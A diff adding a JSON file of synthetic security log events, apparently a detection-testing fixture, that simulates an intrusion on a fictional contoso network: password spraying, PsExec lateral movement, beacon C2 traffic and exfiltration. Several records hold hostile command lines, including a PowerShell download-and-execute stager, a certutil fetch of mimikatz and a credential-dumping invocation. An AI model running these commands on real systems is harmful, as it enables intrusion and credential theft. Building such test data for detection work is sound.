@@ -1,0 +1,266 @@
+[
+  {
+    "Type": "SigninLogs",
+    "TimeGenerated": "2024-01-15T08:00:00Z",
+    "UserPrincipalName": "j.smith@contoso.com",
+    "IPAddress": "203.0.113.10",
+    "AppDisplayName": "Microsoft 365",
+    "ResultType": "0",
+    "Location": "US"
+  },
+  {
+    "Type": "SigninLogs",
+    "TimeGenerated": "2024-01-15T08:15:00Z",
+    "UserPrincipalName": "m.jones@contoso.com",
+    "IPAddress": "203.0.113.11",
+    "AppDisplayName": "Azure Portal",
+    "ResultType": "0",
+    "Location": "US"
+  },
+  {
+    "Type": "CommonSecurityLog",
+    "TimeGenerated": "2024-01-15T08:30:00Z",
+    "SourceIP": "10.1.0.50",
+    "DestinationIP": "8.8.8.8",
+    "DestinationPort": 53,
+    "DeviceVendor": "Palo Alto Networks",
+    "DeviceAction": "Allow",
+    "Protocol": "UDP"
+  },
+  {
+    "Type": "CommonSecurityLog",
+    "TimeGenerated": "2024-01-15T08:45:00Z",
+    "SourceIP": "10.1.0.51",
+    "DestinationIP": "13.107.42.14",
+    "DestinationPort": 443,
+    "DeviceVendor": "Palo Alto Networks",
+    "DeviceAction": "Allow",
+    "Protocol": "TCP"
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:00:00Z",
+    "EventID": 4625,
+    "Computer": "DC-01.contoso.local",
+    "TargetUserName": "admin",
+    "IpAddress": "198.51.100.77",
+    "LogonType": 3
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:00:05Z",
+    "EventID": 4625,
+    "Computer": "DC-01.contoso.local",
+    "TargetUserName": "administrator",
+    "IpAddress": "198.51.100.77",
+    "LogonType": 3
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:00:10Z",
+    "EventID": 4625,
+    "Computer": "DC-01.contoso.local",
+    "TargetUserName": "svc-backup",
+    "IpAddress": "198.51.100.77",
+    "LogonType": 3
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:00:15Z",
+    "EventID": 4624,
+    "Computer": "DC-01.contoso.local",
+    "TargetUserName": "svc-backup",
+    "IpAddress": "198.51.100.77",
+    "LogonType": 3
+  },
+  {
+    "Type": "SigninLogs",
+    "TimeGenerated": "2024-01-15T10:05:00Z",
+    "UserPrincipalName": "svc-backup@contoso.com",
+    "IPAddress": "198.51.100.77",
+    "AppDisplayName": "Azure Portal",
+    "ResultType": "0",
+    "Location": "RU"
+  },
+  {
+    "Type": "SigninLogs",
+    "TimeGenerated": "2024-01-15T10:10:00Z",
+    "UserPrincipalName": "svc-backup@contoso.com",
+    "IPAddress": "198.51.100.77",
+    "AppDisplayName": "Microsoft Graph Explorer",
+    "ResultType": "0",
+    "Location": "RU"
+  },
+  {
+    "Type": "SigninLogs",
+    "TimeGenerated": "2024-01-15T10:12:00Z",
+    "UserPrincipalName": "svc-backup@contoso.com",
+    "IPAddress": "198.51.100.77",
+    "AppDisplayName": "Azure Key Vault",
+    "ResultType": "0",
+    "Location": "RU"
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:20:00Z",
+    "EventID": 4688,
+    "Computer": "WS-FINANCE-01.contoso.local",
+    "SubjectUserName": "svc-backup",
+    "NewProcessName": "C:\\Windows\\System32\\PsExec.exe",
+    "NewProcessId": "0x1A2B",
+    "CommandLine": "PsExec.exe \\\\WS-FINANCE-01 -s cmd.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:20:05Z",
+    "EventID": 4688,
+    "Computer": "WS-FINANCE-01.contoso.local",
+    "SubjectUserName": "svc-backup",
+    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "NewProcessId": "0x2C3D",
+    "CommandLine": "cmd.exe /c whoami && net user /domain",
+    "ParentProcessName": "C:\\Windows\\System32\\PsExec.exe"
+  },
+  {
+    "Type": "DeviceProcessEvents",
+    "Timestamp": "2024-01-15T10:22:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "AccountName": "svc-backup",
+    "FileName": "powershell.exe",
+    "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ProcessCommandLine": "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/stager.ps1')",
+    "InitiatingProcessFileName": "cmd.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
+    "SHA256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
+  },
+  {
+    "Type": "DeviceFileEvents",
+    "Timestamp": "2024-01-15T10:23:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "ActionType": "FileCreated",
+    "FileName": "beacon.exe",
+    "FolderPath": "C:\\Users\\Public\\beacon.exe",
+    "InitiatingProcessFileName": "powershell.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SHA256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+  },
+  {
+    "Type": "DeviceFileEvents",
+    "Timestamp": "2024-01-15T10:23:30Z",
+    "DeviceName": "WS-FINANCE-01",
+    "ActionType": "FileCreated",
+    "FileName": "config.dat",
+    "FolderPath": "C:\\Users\\Public\\config.dat",
+    "InitiatingProcessFileName": "powershell.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "Type": "DeviceProcessEvents",
+    "Timestamp": "2024-01-15T10:24:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "AccountName": "svc-backup",
+    "FileName": "beacon.exe",
+    "FolderPath": "C:\\Users\\Public\\beacon.exe",
+    "ProcessCommandLine": "beacon.exe --c2 198.51.100.77 --interval 30",
+    "InitiatingProcessFileName": "powershell.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SHA256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+  },
+  {
+    "Type": "DeviceFileEvents",
+    "Timestamp": "2024-01-15T10:25:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "ActionType": "FileRead",
+    "FileName": "credentials.xlsx",
+    "FolderPath": "C:\\Users\\svc-backup\\Documents\\credentials.xlsx",
+    "InitiatingProcessFileName": "beacon.exe",
+    "InitiatingProcessFolderPath": "C:\\Users\\Public\\beacon.exe"
+  },
+  {
+    "Type": "DeviceNetworkEvents",
+    "Timestamp": "2024-01-15T10:26:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "RemoteIP": "198.51.100.77",
+    "RemotePort": 443,
+    "RemoteUrl": "https://198.51.100.77/beacon",
+    "Protocol": "TCP",
+    "ActionType": "ConnectionSuccess",
+    "LocalPort": 52341
+  },
+  {
+    "Type": "DeviceNetworkEvents",
+    "Timestamp": "2024-01-15T10:26:30Z",
+    "DeviceName": "WS-FINANCE-01",
+    "RemoteIP": "198.51.100.77",
+    "RemotePort": 443,
+    "RemoteUrl": "https://198.51.100.77/beacon",
+    "Protocol": "TCP",
+    "ActionType": "ConnectionSuccess",
+    "LocalPort": 52342
+  },
+  {
+    "Type": "DeviceNetworkEvents",
+    "Timestamp": "2024-01-15T10:27:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "RemoteIP": "198.51.100.78",
+    "RemotePort": 8080,
+    "RemoteUrl": "http://198.51.100.78/exfil",
+    "Protocol": "TCP",
+    "ActionType": "ConnectionSuccess",
+    "LocalPort": 52400
+  },
+  {
+    "Type": "SecurityEvent",
+    "TimeGenerated": "2024-01-15T10:28:00Z",
+    "EventID": 4663,
+    "Computer": "WS-FINANCE-01.contoso.local",
+    "ProcessName": "C:\\Users\\Public\\beacon.exe",
+    "ObjectName": "C:\\Users\\svc-backup\\Documents\\financial_report_Q4.docx"
+  },
+  {
+    "Type": "DeviceProcessEvents",
+    "Timestamp": "2024-01-15T10:30:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "AccountName": "svc-backup",
+    "FileName": "certutil.exe",
+    "FolderPath": "C:\\Windows\\System32\\certutil.exe",
+    "ProcessCommandLine": "certutil.exe -urlcache -split -f http://198.51.100.77/mimikatz.exe C:\\Users\\Public\\mimi.exe",
+    "InitiatingProcessFileName": "beacon.exe",
+    "InitiatingProcessFolderPath": "C:\\Users\\Public\\beacon.exe"
+  },
+  {
+    "Type": "DeviceFileEvents",
+    "Timestamp": "2024-01-15T10:30:10Z",
+    "DeviceName": "WS-FINANCE-01",
+    "ActionType": "FileCreated",
+    "FileName": "mimi.exe",
+    "FolderPath": "C:\\Users\\Public\\mimi.exe",
+    "InitiatingProcessFileName": "certutil.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\System32\\certutil.exe",
+    "SHA256": "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe"
+  },
+  {
+    "Type": "DeviceProcessEvents",
+    "Timestamp": "2024-01-15T10:31:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "AccountName": "svc-backup",
+    "FileName": "mimi.exe",
+    "FolderPath": "C:\\Users\\Public\\mimi.exe",
+    "ProcessCommandLine": "mimi.exe sekurlsa::logonpasswords",
+    "InitiatingProcessFileName": "beacon.exe",
+    "InitiatingProcessFolderPath": "C:\\Users\\Public\\beacon.exe",
+    "SHA256": "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe"
+  },
+  {
+    "Type": "DeviceNetworkEvents",
+    "Timestamp": "2024-01-15T10:35:00Z",
+    "DeviceName": "WS-FINANCE-01",
+    "RemoteIP": "198.51.100.78",
+    "RemotePort": 443,
+    "RemoteUrl": "https://198.51.100.78/upload",
+    "Protocol": "TCP",
+    "ActionType": "ConnectionSuccess",
+    "LocalPort": 52500
+  }
+]
